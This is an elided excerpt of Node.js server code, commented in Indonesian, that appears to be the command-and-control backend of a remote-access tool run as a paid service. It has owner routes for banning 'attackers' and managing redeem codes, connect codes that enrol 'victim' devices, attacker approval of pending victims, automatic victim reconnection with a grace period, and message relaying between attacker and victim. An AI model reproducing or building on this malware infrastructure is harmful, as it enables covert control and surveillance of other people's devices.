...
const acceptedSessions = new Map(); // code → { victimId, attackerId } — untuk reconnect otomatis
...
app.put('/api/owner/attackers/:id/ban', ownerOnly, (req, res) => {
  ...
  DB.update(db => {
    ...
    if (banned) { const conn = attackers.get(a.id); if (conn) { conn.ws.send(JSON.stringify({ type: 'banned', reason })); conn.ws.close(); } }
  });
});
...
app.get('/api/owner/redeem',  ownerOnly, (req, res) => res.json({ success: true, codes: DB.get().redeem_codes }));
...
app.delete('/api/owner/redeem/:id', ownerOnly, (req, res) => {
  DB.update(db => { const idx = db.redeem_codes.findIndex(x => x.id === req.params.id); if (idx !== -1) db.redeem_codes.splice(idx, 1); res.json({ success: true }); });
});
...
app.delete('/api/attacker/codes/:code', auth, (req, res) => {
  DB.update(db => { db.connect_codes = db.connect_codes.filter(c => !(c.code === req.params.code && c.attacker_id === req.user.id)); res.json({ success: true }); });
});
...
wss.on('connection', ws => {
  ...
  ws.on('message', data => {
    ...
    if (msg.type === 'attacker_connect') {
      try {
        ...
        const activeVic = [];
        victims.forEach((v, id) => { if (v.attackerId === user.id && !v.pending) activeVic.push({ victimId: id, deviceInfo: v.deviceInfo }); });
        ws.send(JSON.stringify({ type: 'connected', role: a.role, username: a.username, victims: activeVic }));
        // Re-send pending victims
    ...
    if (msg.type === 'victim_connect') {
      ...
      // Cek apakah korban ini pernah di-accept sebelumnya (reconnect)
      const prevSession = acceptedSessions.get(msg.code);
      let vid, isReconnect = false;

      if (prevSession && prevSession.attackerId === c.attacker_id) {
        vid = prevSession.victimId;
        isReconnect = true;
        // Cancel grace period timer jika ada
        if (disconnectTimers.has(vid)) { clearTimeout(disconnectTimers.get(vid)); disconnectTimers.delete(vid); }
      } else {
        vid = 'V' + uuid().substr(0,8).toUpperCase();
      }

      ws.role = 'victim'; ws.victimId = vid; ws.attackerId = c.attacker_id;
      victims.set(vid, { ws, attackerId: c.attacker_id, code: msg.code, deviceInfo: msg.deviceInfo || {}, pending: !isReconnect });

      if (isReconnect) {
        // Auto-reconnect: langsung accepted
        ...
        if (aConn && aConn.ws.readyState === WebSocket.OPEN) {
          aConn.ws.send(JSON.stringify({ type: 'victim_reconnected', victimId: vid, deviceInfo: msg.deviceInfo || {} }));
        }
        log(`Victim RECONNECT [${vid}]`);
      } else {
        // Koneksi baru - tunggu attacker approve
        ws.send(JSON.stringify({ type: 'code_valid', victimId: vid }));
        const aConn = attackers.get(c.attacker_id);
        if (aConn && aConn.ws.readyState === WebSocket.OPEN) {
          aConn.ws.send(JSON.stringify({ type: 'victim_pending', victimId: vid, deviceInfo: msg.deviceInfo || {}, code: msg.code }));
        }
        log(`Victim NEW [${vid}]`);
      }
      return;
    ...
    if (ws.role === 'attacker' && msg.type === 'add_victim') {
      ...
      v.pending = false;
      // Simpan session untuk auto-reconnect
    ...
    if (ws.role === 'attacker') {
      ...
      if (!v || v.attackerId !== ws.userId || v.ws.readyState !== WebSocket.OPEN) {
        ws.send(JSON.stringify({ type: 'victim_offline', victimId: msg.targetId })); return;
      }
    ...
    if (ws.role === 'victim') {
      ...
      if (msg.type === 'chat' && msg.sender === 'victim') { aConn.ws.send(JSON.stringify({ type: 'chat_vic', text: msg.text, sourceId: ws.victimId })); return; }
  ...
  ws.on('close', () => {
    ...
    if (ws.role === 'victim' && ws.victimId) {
      ...
      // Grace period 15 detik sebelum tandai offline
      const timer = setTimeout(() => {
        const current = victims.get(vid);
        if (current && current.ws === ws) {
          victims.delete(vid);
          const aConn = attackers.get(aid);
          if (aConn && aConn.ws.readyState === WebSocket.OPEN) {
            aConn.ws.send(JSON.stringify({ type: 'victim_offline', victimId: vid }));
          }
          log(`Victim OFFLINE [${vid}]`);
        }
        disconnectTimers.delete(vid);
      }, 15000);
      disconnectTimers.set(vid, timer);
    }
  });
